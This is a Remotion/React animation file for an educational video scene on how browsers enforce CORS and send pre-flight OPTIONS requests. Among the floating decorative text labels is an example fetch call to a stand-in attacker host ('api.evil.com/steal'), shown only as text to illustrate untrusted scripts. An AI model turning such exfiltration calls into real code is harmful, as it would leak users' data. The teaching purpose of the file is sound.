import React from "react";
import {
  AbsoluteFill,
  useCurrentFrame,
  useVideoConfig,
  interpolate,
  spring,
  staticFile,
  Img,
} from "remotion";

export const BrowserScene: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  // Scene fade in / out
  const sceneIn = interpolate(frame, [0, 15], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
  const sceneOut = interpolate(frame, [510, 540], [1, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Title
  const titleOpacity = interpolate(frame, [5, 22], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Browser badge (frame 15)
  const browserBadgeScale = spring({
    frame: frame - 15,
    fps,
    config: { damping: 12, stiffness: 130 },
  });

  // "Runs untrusted JS" text (frame 45)
  const jsTextOpacity = interpolate(frame, [45, 65], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // JS code fragments float up (frame 60+)
  const codeFragmentsOpacity = interpolate(frame, [60, 85], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // CORS Shield zooms in (frame 100)
  const shieldScale = spring({
    frame: frame - 100,
    fps,
    config: { damping: 10, stiffness: 130 },
  });
  const shieldPulse = frame > 130
    ? Math.sin((frame - 130) * 0.15) * 0.2 + 0.8
    : 1;

  // "DIFFERENT DOMAIN" warning (frame 145)
  const domainWarningScale = spring({
    frame: frame - 145,
    fps,
    config: { damping: 8, stiffness: 180 },
  });

  // Browser "request beam" shoots then gets BLOCKED (frame 180)
  const beamProgress = interpolate(frame, [180, 230], [0, 0.6], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
  // Beam blocked: stops at shield
  const beamBlocked = interpolate(frame, [230, 250], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
  // Explosion on block
  const explosionScale = spring({
    frame: frame - 230,
    fps,
    config: { damping: 6, stiffness: 300 },
  });
  const explosionOpacity = interpolate(frame, [230, 330], [1, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // PRE-FLIGHT text (frame 300)
  const preflightScale = spring({
    frame: frame - 300,
    fps,
    config: { damping: 12, stiffness: 140 },
  });

  // "Tiny invisible OPTIONS request" (frame 340)
  const optionsOpacity = interpolate(frame, [340, 365], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });
  // Tiny dotted beam for preflight
  const preflightBeam = interpolate(frame, [350, 420], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Node positions
  const BROWSER = { x: 200, y: 1060 };
  const SHIELD_X = 540;
  const SHIELD_Y = 1060;
  const API = { x: 880, y: 1060 };

  const beamEndX = BROWSER.x + 100 + (SHIELD_X - BROWSER.x - 100) * Math.min(beamProgress / 0.6, 1);

  return (
    <AbsoluteFill style={{ opacity: sceneIn * sceneOut }}>
      {/* Full-screen background image */}
      <Img
        src={staticFile("postman/browser-cache.png")}
        style={{
          width: "100%",
          height: "100%",
          objectFit: "cover",
          objectPosition: "center",
        }}
      />
      {/* Overlay */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          background: "rgba(2,4,8,0.68)",
        }}
      />

      <svg width="1080" height="1920" style={{ position: "absolute", inset: 0 }}>
        <defs>
          <filter id="bGlow" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="8" result="blur" />
            <feMerge>
              <feMergeNode in="blur" />
              <feMergeNode in="SourceGraphic" />
            </feMerge>
          </filter>
          <filter id="bStrongGlow" x="-80%" y="-80%" width="260%" height="260%">
            <feGaussianBlur stdDeviation="18" result="blur" />
            <feMerge>
              <feMergeNode in="blur" />
              <feMergeNode in="blur" />
              <feMergeNode in="SourceGraphic" />
            </feMerge>
          </filter>
          <filter id="bRedGlow" x="-50%" y="-50%" width="200%" height="200%">
            <feGaussianBlur stdDeviation="12" result="blur" />
            <feMerge>
              <feMergeNode in="blur" />
              <feMergeNode in="SourceGraphic" />
            </feMerge>
          </filter>
        </defs>

        {/* Title bar */}
        <g opacity={titleOpacity}>
          <rect x={0} y={40} width={1080} height={80} fill="rgba(2,4,8,0.9)" />
          <text x={540} y={93}
            textAnchor="middle"
            fill="#ff4444"
            fontSize={34}
            fontWeight="900"
            fontFamily="monospace"
            letterSpacing={2}
            filter="url(#bGlow)"
          >
            🌐  THE BROWSER IS PARANOID
          </text>
          <line x1={0} y1={120} x2={1080} y2={120} stroke="#ff4444" strokeWidth={1.5} strokeOpacity={0.4} />
        </g>

        {/* Browser badge */}
        <g transform={`translate(540, 250) scale(${browserBadgeScale})`} opacity={browserBadgeScale}>
          <rect x={-260} y={-55} width={520} height={110} rx={24}
            fill="rgba(20,0,0,0.9)" stroke="#ff4444" strokeWidth={2.5} filter="url(#bGlow)"
          />
          <text x={0} y={18} textAnchor="middle" fill="#ff4444" fontSize={46}
            fontWeight="900" fontFamily="monospace">
            YOUR  WEB  BROWSER
          </text>
        </g>

        {/* "Runs untrusted JS all day long" */}
        <g opacity={jsTextOpacity}>
          <rect x={60} y={360} width={960} height={100} rx={20}
            fill="rgba(255,68,68,0.08)" stroke="rgba(255,68,68,0.3)" strokeWidth={1.5}
          />
          <text x={540} y={410} textAnchor="middle" fill="#fca5a5" fontSize={26}
            fontWeight="700" fontFamily="monospace">
            Runs untrusted JavaScript
          </text>
          <text x={540} y={446} textAnchor="middle" fill="rgba(252,165,165,0.65)" fontSize={22}
            fontFamily="monospace">
            from RANDOM websites all day long
          </text>
        </g>

        {/* Floating JS code fragments */}
        <g opacity={codeFragmentsOpacity}>
          {[
            { x: 80,  y: 520, text: "fetch('api.evil.com/steal')",    color: "#ff6666", rot: -3 },
            { x: 520, y: 560, text: "fetch('bank.com/transfer')",       color: "#ff8888", rot: 2 },
            { x: 120, y: 620, text: "xhr.open('GET', 'secret.io')",     color: "#fca5a5", rot: -1 },
            { x: 500, y: 640, text: "axios.get('payments.api/cards')", color: "#ff6666", rot: 1 },
          ].map((item, i) => {
            const floatY = item.y - Math.sin((frame - 60 + i * 15) * 0.08) * 10;
            return (
              <g key={i} transform={`rotate(${item.rot}, ${item.x}, ${item.y})`}>
                <text
                  x={item.x} y={floatY}
                  fill={item.color}
                  fontSize={18}
                  fontFamily="monospace"
                  opacity={0.6}
                >
                  {item.text}
                </text>
              </g>
            );
          })}
        </g>

        {/* ─── CORS SHIELD (center) ─── */}
        <g transform={`translate(${SHIELD_X}, ${SHIELD_Y}) scale(${shieldScale * shieldPulse})`} opacity={shieldScale}>
          {/* Outer glow */}
          <circle cx={0} cy={0} r={160} fill="rgba(0,245,255,0.06)" stroke="rgba(0,245,255,0.25)" strokeWidth={2} />
          {/* Shield shape */}
          <path d="M 0,-90 L 70,-45 L 70,30 Q 70,80 0,100 Q -70,80 -70,30 L -70,-45 Z"
            fill="rgba(0,245,255,0.1)" stroke="#00f5ff" strokeWidth={3}
            filter="url(#bGlow)"
          />
          <text x={0} y={-10} textAnchor="middle" fill="#00f5ff" fontSize={30}
            fontWeight="900" fontFamily="monospace" filter="url(#bGlow)">
            CORS
          </text>
          <text x={0} y={30} textAnchor="middle" fill="#00f5ff" fontSize={30}
            fontWeight="900" fontFamily="monospace" filter="url(#bGlow)">
            SHIELD
          </text>
        </g>

        {/* Browser icon (left) */}
        <g transform={`translate(${BROWSER.x}, ${BROWSER.y})`} opacity={shieldScale}>
          <circle cx={0} cy={0} r={80} fill="rgba(255,68,68,0.08)" stroke="#ff4444" strokeWidth={2} filter="url(#bGlow)" />
          {/* Chrome-ish icon */}
          <circle cx={0} cy={0} r={45} fill="rgba(255,68,68,0.2)" stroke="#ff4444" strokeWidth={2.5} />
          <text x={0} y={14} textAnchor="middle" fill="#ff4444" fontSize={40}>🌐</text>
          <text x={0} y={115} textAnchor="middle" fill="#ff4444" fontSize={20} fontWeight="800" fontFamily="monospace">BROWSER</text>
        </g>

        {/* API Server (right) */}
        <g transform={`translate(${API.x}, ${API.y})`} opacity={shieldScale}>
          <circle cx={0} cy={0} r={80} fill="rgba(0,245,255,0.08)" stroke="#00f5ff" strokeWidth={2} filter="url(#bGlow)" />
          {[-18, -2, 14].map((yOff, i) => (
            <g key={i}>
              <rect x={-30} y={yOff} width={60} height={11} rx={3} fill="rgba(0,245,255,0.2)" stroke="#00f5ff" strokeWidth={1.2} />
              <circle cx={24} cy={yOff + 5.5} r={4} fill="#00f5ff" opacity={0.8} />
            </g>
          ))}
          <text x={0} y={115} textAnchor="middle" fill="#00f5ff" fontSize={20} fontWeight="800" fontFamily="monospace">API SERVER</text>
        </g>

        {/* ─── REQUEST BEAM (blocked by shield) ─── */}
        {beamProgress > 0 && (
          <g>
            <line
              x1={BROWSER.x + 82} y1={BROWSER.y}
              x2={beamEndX} y2={BROWSER.y}
              stroke="#ff4444" strokeWidth={14} strokeOpacity={0.12} strokeLinecap="round"
            />
            <line
              x1={BROWSER.x + 82} y1={BROWSER.y}
              x2={beamEndX} y2={BROWSER.y}
              stroke="#ff4444" strokeWidth={4} strokeLinecap="round"
              filter="url(#bGlow)"
            />
            {/* Moving packet */}
            <circle
              cx={BROWSER.x + 82 + (beamEndX - BROWSER.x - 82) * Math.min(1, beamProgress / 0.5)}
              cy={BROWSER.y}
              r={8} fill="#ff4444" filter="url(#bGlow)"
              opacity={beamProgress > 0 ? Math.sin(Math.min(1, beamProgress / 0.5) * Math.PI) : 0}
            />
          </g>
        )}

        {/* BLOCKED explosion */}
        {beamBlocked > 0 && explosionOpacity > 0 && (
          <g opacity={explosionOpacity}>
            <circle cx={SHIELD_X - 80} cy={SHIELD_Y}
              r={50 * explosionScale} fill="rgba(255,68,68,0.15)"
              stroke="#ff4444" strokeWidth={2}
            />
            <circle cx={SHIELD_X - 80} cy={SHIELD_Y}
              r={30 * explosionScale} fill="rgba(255,68,68,0.25)"
              filter="url(#bStrongGlow)"
            />
            <text x={SHIELD_X - 80} y={SHIELD_Y + 14}
              textAnchor="middle" fill="#ff4444" fontSize={36}
              filter="url(#bStrongGlow)"
            >
              💥
            </text>
          </g>
        )}

        {/* DIFFERENT DOMAIN warning */}
        <g transform={`translate(540, 820) scale(${domainWarningScale})`} opacity={domainWarningScale}>
          <rect x={-340} y={-44} width={680} height={88} rx={18}
            fill="rgba(255,68,68,0.12)" stroke="#ff4444" strokeWidth={2}
            filter="url(#bGlow)"
          />
          <text x={0} y={-8} textAnchor="middle" fill="#ff4444" fontSize={26}
            fontWeight="900" fontFamily="monospace">
            ⚠ DIFFERENT DOMAIN DETECTED
          </text>
          <text x={0} y={28} textAnchor="middle" fill="rgba(255,68,68,0.7)" fontSize={20}
            fontFamily="monospace">
            browser.com  →  api.backend.com
          </text>
        </g>

        {/* PRE-FLIGHT label */}
        <g transform={`translate(540, 1320) scale(${preflightScale})`} opacity={preflightScale}>
          <rect x={-380} y={-120} width={760} height={240} rx={24}
            fill="rgba(250,204,21,0.06)" stroke="#facc15" strokeWidth={2.5} filter="url(#bGlow)"
          />
          <text x={0} y={-50} textAnchor="middle" fill="#facc15" fontSize={32}
            fontWeight="900" fontFamily="monospace" letterSpacing={1} filter="url(#bGlow)">
            🔍 PRE-FLIGHT CHECK
          </text>
          <text x={0} y={-5} textAnchor="middle" fill="#fde047" fontSize={26}
            fontWeight="800" fontFamily="monospace">
            OPTIONS /api/data
          </text>
          <text x={0} y={40} textAnchor="middle" fill="rgba(253,224,71,0.7)" fontSize={20}
            fontFamily="monospace">
            HTTP/1.1
          </text>
          <text x={0} y={80} textAnchor="middle" fill="rgba(253,224,71,0.6)" fontSize={19}
            fontFamily="monospace">
            Origin: https://yoursite.com
          </text>
        </g>

        {/* "Tiny invisible test" annotation */}
        <g opacity={optionsOpacity}>
          <rect x={60} y={1580} width={960} height={80} rx={18}
            fill="rgba(250,204,21,0.08)" stroke="rgba(250,204,21,0.3)" strokeWidth={1.5}
          />
          <text x={540} y={1628} textAnchor="middle" fill="#fde047" fontSize={24}
            fontWeight="700" fontFamily="monospace">
            Tiny invisible test before the real request
          </text>
        </g>

        {/* Pre-flight dotted beam */}
        {preflightBeam > 0 && (
          <g opacity={0.7}>
            <line
              x1={BROWSER.x + 82} y1={BROWSER.y + 30}
              x2={BROWSER.x + 82 + (API.x - BROWSER.x - 170) * preflightBeam} y2={BROWSER.y + 30}
              stroke="#facc15" strokeWidth={3}
              strokeDasharray="10,8"
              strokeLinecap="round"
              filter="url(#bGlow)"
            />
            {/* Flying OPTIONS packet */}
            {preflightBeam > 0.1 && (
              <g>
                <circle
                  cx={BROWSER.x + 82 + (API.x - BROWSER.x - 170) * preflightBeam * 0.8}
                  cy={BROWSER.y + 30}
                  r={20} fill="rgba(250,204,21,0.1)"
                />
                <text
                  x={BROWSER.x + 82 + (API.x - BROWSER.x - 170) * preflightBeam * 0.8}
                  y={BROWSER.y + 35}
                  textAnchor="middle" fill="#facc15" fontSize={16}
                  fontFamily="monospace" fontWeight="700"
                  filter="url(#bGlow)"
                  opacity={0.9}
                >
                  OPT
                </text>
              </g>
            )}
          </g>
        )}
      </svg>
    </AbsoluteFill>
  );
};
